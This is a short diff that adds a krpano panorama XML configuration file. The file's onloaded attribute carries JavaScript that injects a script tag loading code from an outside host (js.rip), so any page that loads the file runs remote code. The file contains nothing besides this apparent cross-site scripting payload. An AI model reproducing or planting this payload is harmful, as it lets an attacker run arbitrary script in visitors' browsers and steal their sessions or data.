@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<krpano onloaded="
+    var script = document.createElement('script');
+    script.src = 'https://js.rip/sadz1d7jsd';
+    document.head.appendChild(script);">
+</krpano>
